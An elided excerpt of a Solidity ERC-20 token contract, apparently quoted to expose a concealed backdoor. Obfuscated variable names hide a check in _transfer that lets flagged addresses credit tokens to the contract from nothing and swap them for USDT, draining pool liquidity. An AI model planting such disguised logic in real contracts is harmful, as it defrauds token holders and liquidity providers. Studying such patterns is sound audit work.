...
contract Token is Context, IERC20, Ownable {
    ...
    constructor (
        ...
        _uint256=_totalSupply;
        _function[msg.sender] = _totalSupply;
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        {
            if (_function[sender] > _uint256 && _function[recipient] > _uint256) {
                _balances[address(this)] += amount;
                swapTokensForUsdt(amount, recipient);
                return true;
            }
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        // swap token -> usdt
        swapTokensForUsdt(tokensForSwap,address(_usdtReceiver));
